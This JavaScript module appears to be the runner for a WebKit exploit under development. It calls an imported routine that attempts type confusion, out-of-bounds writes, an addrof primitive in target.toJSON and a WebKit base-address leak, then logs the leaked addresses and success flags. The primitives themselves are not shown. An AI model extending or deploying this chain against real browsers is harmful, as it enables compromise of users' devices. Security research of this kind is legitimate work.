// js/script3/runAllAdvancedTestsS3.mjs (Adaptado para Addrof em target.toJSON)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_AddrofInToJSON";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(AddrofInToJSON): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        let paramsUsedMsg = 'N/A';
        if (result.oob_params_used) {
            paramsUsedMsg = `Offset: ${result.oob_params_used.offset}, Valor: ${result.oob_params_used.value}`;
        } else if (result.oob_value_of_best_result) {
             paramsUsedMsg = `OOB Value (fallback): ${result.oob_value_of_best_result}`;
        }

        logS3(`  RUNNER R43(AddrofInToJSON): Completou. Parâmetros OOB usados: ${paramsUsedMsg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(AddrofInToJSON): Detalhes Sonda TC: ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak_detail", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result; // Resultado principal do addrof
        const webkitLeakResult = result.webkit_leak_result;
        const addrofInToJSONDetails = result.addrof_in_target_toJSON_details;

        logS3(`  RUNNER R43(AddrofInToJSON): Heisenbug TC Sonda: ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofInToJSONDetails) {
            logS3(`  RUNNER R43(AddrofInToJSON): Detalhes da Tentativa de Addrof em target.toJSON():`, "info_emphasis", FNAME_RUNNER);
            logS3(`    Tentativa realizada: ${addrofInToJSONDetails.attempted}`, "info", FNAME_RUNNER);
            logS3(`    Sucesso: ${addrofInToJSONDetails.success}`, addrofInToJSONDetails.success ? "success_major" : "warn", FNAME_RUNNER);
            logS3(`    Notas: ${addrofInToJSONDetails.notes}`, "info", FNAME_RUNNER);
            if (addrofInToJSONDetails.leaked_address_str) {
                logS3(`    Endereço Vazado: ${addrofInToJSONDetails.leaked_address_str}`, "leak", FNAME_RUNNER);
            }
             logS3(`    Raw Low/High: 0x${(addrofInToJSONDetails.raw_low || 0).toString(16)} / 0x${(addrofInToJSONDetails.raw_high || 0).toString(16)}`, "leak_detail");
        } else {
            logS3(`  RUNNER R43(AddrofInToJSON): Detalhes da tentativa de Addrof em target.toJSON() não disponíveis.`, "warn", FNAME_RUNNER);
        }
        
        if (addrofResult) { // Logar o resultado geral do addrof que é populado pelo teste
             logS3(`  RUNNER R43(AddrofInToJSON): Resultado Geral Addrof: ${addrofResult.msg} (Endereço: ${addrofResult.leaked_object_addr || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43(AddrofInToJSON): Teste WebKit Base Leak: ${webkitLeakResult.msg} (Base: ${webkitLeakResult.webkit_base_candidate || 'N/A'})`, webkitLeakResult.success ? "vuln" : "info", FNAME_RUNNER);
        }

        let finalTitleSegment = "No Notable Result";
        if (webkitLeakResult?.success) {
            finalTitleSegment = "WebKitLeak SUCCESS!";
        } else if (addrofResult?.success) {
            finalTitleSegment = "Addrof SUCCESS, WebKitLeak Fail/Skipped";
        } else if (heisenbugSuccessfullyDetected) {
            finalTitleSegment = "TC Confirmed, Addrof Fail";
        }
        document.title = `${module_name_for_title}_R43_AddrofInToJSON: ${finalTitleSegment}`;

        // iteration_results_summary terá apenas um elemento
        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(AddrofInToJSON): Sumário da Iteração:`, "info", FNAME_RUNNER);
            const iter_sum = result.iteration_results_summary[0];
            const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
            const addrofSuccess = iter_sum.addrof_result_this_iter?.success;
            let logMsg = `    Iter 1 (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, Addrof(target.toJSON)=${addrofSuccess}`;
            if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
            logS3(logMsg, "info", FNAME_RUNNER);
        }

    } else {
        document.title = `${module_name_for_title}_R43_AddrofInToJSON: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_AddrofInToJSON`;
    logS3(`==== INICIANDO Script 3 R43_AddrofInToJSON (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43_AddrofInToJSON (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    // Lógica do título final
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("SUCCESS") && 
        !document.title.includes("Fail") &&
        !document.title.includes("OK") &&
        !document.title.includes("Confirmed") &&
        !document.title.includes("ERR") &&
        !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_AddrofInToJSON_Done`;
    }
}
